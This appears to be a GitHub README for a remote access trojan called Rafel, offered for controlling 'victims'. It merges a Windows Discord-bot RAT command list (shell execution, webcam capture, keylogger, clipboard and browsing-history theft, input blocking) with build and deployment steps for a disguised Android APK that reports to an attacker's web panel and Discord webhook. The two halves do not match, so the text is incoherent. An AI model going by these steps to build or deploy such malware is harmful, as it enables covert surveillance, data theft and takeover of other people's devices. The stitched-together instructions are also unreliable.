<p align="center">
  <img width="250" height="250" src="https://media.tenor.com/images/2c3668f83f251c47fe4319ed58961898/tenor.gif">
</p>
<h1 align="center">Rafel</h1><p align="center">
<b>Rafel</b> is <b>Remote Access Tool</b> Used to Control Victims Using <b>WebPanel</b> With More Advance Features..
</p>   

<p align=center>  
<a href=https://github.com/BlackDemonHat><img src="https://img.shields.io/badge/Author-BlackDemonHat-red.svg?style=for-the-badge&label=Author" /></a>

<img src="https://img.shields.io/badge/Version-1.0-brightgreen?style=for-the-badge" >
<img src="https://img.shields.io/github/stars/BlackDemonHat/Discord-Rat?style=for-the-badge">  
<img src="https://img.shields.io/github/followers/BlackDemonHat?label=Followers&style=for-the-badge">
</p>   

* **If you like the tool and for my personal motivation so as to develop other tools please leave a +1 star** 
## **Disclaimer:**

This tool is for educational use only, the author will not be held responsible for any misuse of this tool.

## **Setup Guide:**
You will first need to register a bot with the Discord developper portal and then add the bot to the server that you want (make sure bot has administrator privileges).
Once the bot is created copy the token of your bot and paste it at line 17.

Install requirements :
```
pip3 install -r requirements.txt
```
---
**Requirements:**\
Python3,Windows(x64)
---
## **Modules**
```
Availaible commands are :
--> /message = Show a message box displaying your text / Syntax  = "/message example"
--> !shell = Execute a shell command /Syntax  = "/shell whoami"
--> !webcampic = Take a picture from the webcam
--> !windowstart = Start logging current user window (logging is shown in the bot activity)
--> !windowstop = Stop logging current user window 
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !sysinfo = Gives info about infected computer
--> !history = Get computer navigation history
--> !download = Download a file from infected computer
--> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
--> !cd = Changes directory
--> !write = Type your desired sentence on infected computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
--> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
--> !stopkeylogger = Stops keylogger
--> !dumpkeylogger = Dumps the keylog
--> !volumemax = Put volume at 100%
--> !volumezero = Put volume at 0%
--> !idletime = Get the idle time of user's on target computer
--> !sing = Play chosen video in background
--> !stopsing = Stop video playing in background
--> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
--> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
--> !screenshot = Get the screenshot of the user's current screen
--> !exit = Exit program
--> !kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
```

### Prerequisites 
 - Android Studio

OR

- [ApkEasyTool](https://forum.xda-developers.com/android/software-hacking/tool-apk-easy-tool-v1-02-windows-gui-t3333960)
---  
### Building Apk With Android Studio

1.  Open Project ***BlackMart*** in Android Studio 
2.  Put the `command.php` link of server in InternalService.class class
3.  Now open `NotificationListener.java` and enter  replace with your discord webhook url
4.  Build the Project
5.  Zipalign and sign the Apk...
---
### Building Apk with ApkEasyTool:

1. Download <a href="https://github.com/swagkarna/Rafel-Rat/releases/download/release/BlackMart.apk">BlackMartapk</a> and  decompile with `Apktool` and navigate to `smali_classes2\com\velociraptor\raptor`
2. Open `InternalService.smali` 
3. Replace this with your Panel Url ***const-string v0, "https://your-webpanel-url/public/commands.php"***
4. Now open `NotificationListener.smali` and enter replace with your discord webhook url

---
### Building Server 
1. Upload Files in server Folder to Your HostingPanel
2. Now Open login.php 
3. Enter Username ***Hande*** Password ***Ercel***
4. Note : Make Sure your webhosting site uses Https and should have valid connection...I recommend 000webhost.com
5. You can now use panel to send commands and also refresh after it
---
### Rafel-Rat in Action [OLD] :

https://user-images.githubusercontent.com/46685308/120080601-603c5380-c0d7-11eb-82b2-345d0bff7581.mp4

Watch Video in Full Screen For Better Quality

---
## Screenshots[New]
| | | |
|:-------------------------:|:-------------------------:|:-------------------------:|
|<a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> Panel-1</a> | <a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> Panel-2</a> |<a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(72).png?raw=trueg"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(72).png?raw=true"> Panel-3 </a>||

---

### Check this Article 

- https://dontkillmyapp.com/


--- 
## Disclaimer
<b>Swagkarna Provides no warranty and will not be responsible for any direct or indirect damage caused by this tool.<br>
Rafel-Rat is built for Educational and Internal use ONLY.</b>

---

## Contact :
<a href=mailto:swagkarna@gmail.com><img src="https://img.shields.io/badge/Gmail-swagkarna-green?style=for-the-badge" /></a>
<a href=https://twitter.com/swagkarna><img src="https://img.shields.io/badge/Twitter-@swagkarna-blue?style=for-the-badge" /></a>


---    

<p align="center">  
<img src="https://user-images.githubusercontent.com/46685308/113503828-f88fdf00-9551-11eb-9815-7371515655c1.png"></img>
</p>
<h2 align="center">(https://github.com/swagkarna/Rafel-Rat)</h2>

---
### ❤️Supporters❤️
[![Stargazers repo roster for @BlackDemonHat/Discord-Rat](https://reporoster.com/stars/BlackDemonHat/Discord-Rat)](https://github.com/BlackDemonHat/Discord-Rat/stargazers)
[![Forkers repo roster for @BlackDemonHat/Discord-Rat](https://reporoster.com/forks/BlackDemonHat/Discord-Rat)](https://github.com/BlackDemonHat/Discord-Rat/network/members)

---
